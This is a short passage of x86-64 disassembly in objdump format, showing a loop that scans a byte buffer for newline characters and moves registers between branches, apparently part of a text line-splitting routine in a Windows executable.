   14000511b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005120:	42 80 3c 09 0a       	cmpb   $0xa,(%rcx,%r9,1)
   140005125:	74 0a                	je     0x140005131
   140005127:	49 ff c1             	inc    %r9
   14000512a:	4d 39 cb             	cmp    %r9,%r11
   14000512d:	75 f1                	jne    0x140005120
   14000512f:	eb 3f                	jmp    0x140005170
   140005131:	49 01 d1             	add    %rdx,%r9
   140005134:	4e 8d 3c 0f          	lea    (%rdi,%r9,1),%r15
   140005138:	49 ff c7             	inc    %r15
   14000513b:	4c 01 cf             	add    %r9,%rdi
   14000513e:	4c 39 c7             	cmp    %r8,%rdi
   140005141:	0f 83 c9 fe ff ff    	jae    0x140005010
   140005147:	42 80 3c 08 0a       	cmpb   $0xa,(%rax,%r9,1)
   14000514c:	0f 85 be fe ff ff    	jne    0x140005010
   140005152:	48 89 de             	mov    %rbx,%rsi
   140005155:	4c 89 e3             	mov    %r12,%rbx
   140005158:	45 31 f6             	xor    %r14d,%r14d
   14000515b:	4c 89 ff             	mov    %r15,%rdi
   14000515e:	4d 89 fc             	mov    %r15,%r12
   140005161:	eb 27                	jmp    0x14000518a
   140005163:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000516a:	84 00 00 00 00 00 
   140005170:	4d 89 c7             	mov    %r8,%r15
   140005173:	48 89 de             	mov    %rbx,%rsi
